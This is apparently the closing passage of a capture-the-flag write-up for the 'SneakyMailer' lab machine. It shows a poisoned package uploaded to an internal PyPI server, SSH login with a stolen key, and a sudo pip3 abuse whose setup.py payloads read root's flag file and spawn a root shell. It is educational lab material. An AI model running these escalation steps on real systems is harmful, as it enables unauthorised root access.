<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@sneakymailer:~$ python3 setup.py sdist upload -r <span class="nb">local</span>
</span></span><span class="line"><span class="cl">running sdist
</span></span><span class="line"><span class="cl">running egg_info
</span></span><span class="line"><span class="cl">writing low.egg-info/PKG-INFO
</span></span><span class="line"><span class="cl">writing dependency_links to low.egg-info/dependency_links.txt
</span></span><span class="line"><span class="cl">writing top-level names to low.egg-info/top_level.txt
</span></span><span class="line"><span class="cl">reading manifest file <span class="s1">&#39;low.egg-info/SOURCES.txt&#39;</span>
</span></span><span class="line"><span class="cl">writing manifest file <span class="s1">&#39;low.egg-info/SOURCES.txt&#39;</span>
</span></span><span class="line"><span class="cl">warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
</span></span><span class="line"><span class="cl">running check
</span></span><span class="line"><span class="cl">creating low-0.0.1
</span></span><span class="line"><span class="cl">creating low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">copying files to low-0.0.1…
</span></span><span class="line"><span class="cl">copying setup.py -&gt; low-0.0.1
</span></span><span class="line"><span class="cl">copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">Writing low-0.0.1/setup.cfg
</span></span><span class="line"><span class="cl">Creating tar archive
</span></span><span class="line"><span class="cl">removing <span class="s1">&#39;low-0.0.1&#39;</span> <span class="o">(</span>and everything under it<span class="o">)</span>
</span></span><span class="line"><span class="cl">running upload
</span></span><span class="line"><span class="cl">Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
</span></span><span class="line"><span class="cl">Server response <span class="o">(</span>200<span class="o">)</span>: OK
</span></span><span class="line"><span class="cl">WARNING: Uploading via this <span class="nb">command</span> is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
</span></span></code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Now I can login with my private key as user <code>low</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ ssh -i id_ecdsa low@10.10.10.197
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210429021145269.png" alt=""  /></div>
</p>
<p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-pip">Abusing sudo pip</h4>
<p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210429021533891.png" alt=""  /></div>
</p>
<p>I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/pip/">GTFOBins</a> to abuse this circumstance to obtain the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">low@sneakymailer:~$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
</span></span><span class="line"><span class="cl">low@sneakymailer:~$
</span></span><span class="line"><span class="cl">low@sneakymailer:~$ <span class="nb">echo</span> <span class="s1">&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; <span class="nv">$TF</span>/setup.py
</span></span><span class="line"><span class="cl">low@sneakymailer:~$
</span></span><span class="line"><span class="cl">low@sneakymailer:~$ sudo pip3 install <span class="nv">$TF</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210429021914961.png" alt=""  /></div>
</p>
<p>Or to get a shell as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">low@sneakymailer:~$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
</span></span><span class="line"><span class="cl">low@sneakymailer:~$
</span></span><span class="line"><span class="cl">low@sneakymailer:~$ <span class="nb">echo</span> <span class="s2">&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2"> &gt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2"> 2&gt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2">&#39;)&#34;</span> &gt; <span class="nv">$TF</span>/setup.py
</span></span><span class="line"><span class="cl">low@sneakymailer:~$
</span></span><span class="line"><span class="cl">low@sneakymailer:~$ sudo pip3 install <span class="nv">$TF</span>
</span></span><span class="line"><span class="cl">sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
</span></span><span class="line"><span class="cl">Processing /tmp/tmp.9ShSegy5bm
</span></span><span class="line"><span class="cl"><span class="c1"># whoami</span>
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
